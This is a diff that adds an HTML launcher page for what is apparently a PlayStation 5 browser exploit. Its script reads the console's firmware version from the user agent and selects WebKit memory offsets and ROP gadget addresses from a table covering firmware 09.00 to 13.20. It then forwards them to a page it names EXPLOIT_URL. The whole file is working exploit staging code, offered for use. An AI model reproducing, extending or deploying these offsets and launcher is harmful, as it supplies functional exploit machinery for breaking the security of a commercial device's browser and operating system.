@@ -1,0 +1,79 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PS5</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body{
+    user-select:none; -webkit-user-select:none;
+    background-color:#0c0c0f; color:#fff; font-family:Arial;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    height:100vh; margin:0; padding:0; overflow:hidden; box-sizing:border-box;
+}
+#cat{ width:240px; max-width:66vw; border-radius:10px; margin-bottom:26px;
+      box-shadow:0 0 0 2px #2a2a2e, 0 0 20px 4px #2a2a2e; }
+.btn{
+    padding:1rem 2rem; text-align:center; cursor:pointer;
+    min-width:12rem; border-radius:1.25rem; background-color:#202125;
+    border:none; color:#fff; font-size:1.5rem; font-weight:800;
+    transition:background-color 0.25s ease;
+}
+.btn:hover{ background-color:#a2a2a6; color:#202020; }
+</style>
+</head>
+<body>
+<img id="cat" src="cat.jpg" alt="">
+<a tabindex="0" class="btn" id="run">RUN</a>
+
+<script>
+"use strict";
+const EXPLOIT_URL = "notify.html";
+
+// hc host-ctor | gd trampoline | nt notify | gps/gpe getpid slot/export
+// cls/cle close slot/export | ers/ere __error slot/export  (all per webkit build)
+const OFFSETS = {
+  "09.00": { hc:[0x34f98,0x35808,0x35900], gd:0x1cb9a, nt:0x4590, gps:0x33c1960, gpe:0x1ad00, cls:0x33c1950, cle:0x26b40, ers:0x33c1958, ere:0xf160 },
+  "09.20": { hc:[0x34f98,0x35808,0x35900], gd:0x1cb9a, nt:0x4590, gps:0x33c1960, gpe:0x1ad00, cls:0x33c1950, cle:0x26b40, ers:0x33c1958, ere:0xf160 },
+  "09.40": { hc:[0x34f98,0x35808,0x35900], gd:0x1cb9a, nt:0x4590, gps:0x33c1970, gpe:0x1ad00, cls:0x33c1960, cle:0x26b40, ers:0x33c1968, ere:0xf160 },
+  "09.60": { hc:[0x34f98,0x35808,0x35900], gd:0x1cb9a, nt:0x4590, gps:0x33c1970, gpe:0x1ad00, cls:0x33c1960, cle:0x26b40, ers:0x33c1968, ere:0xf160 },
+  "10.00": { hc:[0x2c00,0x5178,0x5690], gd:0x1cdfa, nt:0x45c0, gps:0x35cd750, gpe:0x1af60, cls:0x35cd740, cle:0x26940, ers:0x35cd748, ere:0xf0d0 },
+  "10.01": { hc:[0x2c00,0x5178,0x5690], gd:0x1cdfa, nt:0x45c0, gps:0x35cd750, gpe:0x1af60, cls:0x35cd740, cle:0x26940, ers:0x35cd748, ere:0xf0d0 },
+  "10.20": { hc:[0x2c00,0x5178,0x5690], gd:0x1cdfa, nt:0x45c0, gps:0x35cd750, gpe:0x1af60, cls:0x35cd740, cle:0x26940, ers:0x35cd748, ere:0xf0d0 },
+  "10.40": { hc:[0x2c00,0x5178,0x5690], gd:0x1cdfa, nt:0x45c0, gps:0x35cd750, gpe:0x1af60, cls:0x35cd740, cle:0x26940, ers:0x35cd748, ere:0xf0d0 },
+  "10.60": { hc:[0x2c00,0x5178,0x5690], gd:0x1cdfa, nt:0x45c0, gps:0x35cd750, gpe:0x1af60, cls:0x35cd740, cle:0x26940, ers:0x35cd748, ere:0xf0d0 },
+  "11.00": { hc:[0x1e0d8,0x1e320,0x1f368], gd:0x1d11a, nt:0x4740, gps:0x34f57b8, gpe:0x1b280, cls:0x34f57a8, cle:0x26e70, ers:0x34f57b0, ere:0xf340 },
+  "11.20": { hc:[0x1e0d8,0x1e320,0x1f368], gd:0x1d11a, nt:0x4740, gps:0x34f57b8, gpe:0x1b280, cls:0x34f57a8, cle:0x26e70, ers:0x34f57b0, ere:0xf340 },
+  "11.40": { hc:[0x1e0d8,0x1e320,0x1f368], gd:0x1d11a, nt:0x4740, gps:0x34f57b8, gpe:0x1b280, cls:0x34f57a8, cle:0x26e70, ers:0x34f57b0, ere:0xf340 },
+  "11.60": { hc:[0x1e0d8,0x1e320,0x1f368], gd:0x1d11a, nt:0x4740, gps:0x34f57b8, gpe:0x1b280, cls:0x34f57a8, cle:0x26e70, ers:0x34f57b0, ere:0xf340 },
+  "12.00": { hc:[0x3a888,0x3aad0,0x3bb18], gd:0x1d66a, nt:0x48b0, gps:0x350dc28, gpe:0x1b7d0, cls:0x350dc18, cle:0x27450, ers:0x350dc20, ere:0xf740 },
+  "12.02": { hc:[0x3a888,0x3aad0,0x3bb18], gd:0x1d66a, nt:0x48b0, gps:0x350dc28, gpe:0x1b7d0, cls:0x350dc18, cle:0x27450, ers:0x350dc20, ere:0xf740 },
+  "12.20": { hc:[0x3a888,0x3aad0,0x3bb18], gd:0x1d66a, nt:0x48b0, gps:0x350dc28, gpe:0x1b7d0, cls:0x350dc18, cle:0x27450, ers:0x350dc20, ere:0xf740 },
+  "12.40": { hc:[0x3a888,0x3aad0,0x3bb18], gd:0x1d68a, nt:0x48b0, gps:0x350dc28, gpe:0x1b7f0, cls:0x350dc18, cle:0x27470, ers:0x350dc20, ere:0xf740 },
+  "12.60": { hc:[0x3a888,0x3aad0,0x3bb18], gd:0x1d68a, nt:0x48b0, gps:0x350dc28, gpe:0x1b7f0, cls:0x350dc18, cle:0x27470, ers:0x350dc20, ere:0xf740 },
+  "12.70": { hc:[0x3a888,0x3aad0,0x3bb18], gd:0x1d68a, nt:0x48b0, gps:0x350dc28, gpe:0x1b7f0, cls:0x350dc18, cle:0x27470, ers:0x350dc20, ere:0xf740 },
+  "13.00": { hc:[0x56a58,0x56ca0,0x57ce8], gd:0x1d6fa, nt:0x48b0, gps:0x3352238, gpe:0x1b860, cls:0x3352228, cle:0x274e0, ers:0x3352230, ere:0xf7d0 },
+  "13.20": { hc:[0x56a58,0x56ca0,0x57ce8], gd:0x1d6fa, nt:0x48b0, gps:0x3352238, gpe:0x1b860, cls:0x3352228, cle:0x274e0, ers:0x3352230, ere:0xf7d0 },
+};
+
+function hex(v) { return "0x" + v.toString(16); }
+
+const m = /PlayStation 5\/(\d+)\.(\d+)/.exec(navigator.userAgent);
+const fw = m ? `${m[1].padStart(2, "0")}.${m[2].padStart(2, "0")}` : null;
+const e = fw ? OFFSETS[fw] : null;
+
+document.getElementById("run").addEventListener("click", function () {
+    const q = new URLSearchParams();
+    q.set("go", "1");
+    if (fw) q.set("fw", fw);
+    if (e) {
+        q.set("hc", e.hc.map(hex).join(",")); q.set("gd", hex(e.gd)); q.set("notify", hex(e.nt));
+        q.set("gps", hex(e.gps)); q.set("gpe", hex(e.gpe));
+        q.set("cls", hex(e.cls)); q.set("cle", hex(e.cle));
+        q.set("ers", hex(e.ers)); q.set("ere", hex(e.ere));
+    }
+    location.href = `${EXPLOIT_URL}?${q.toString()}`;
+});
+</script>
+</body>
+</html>
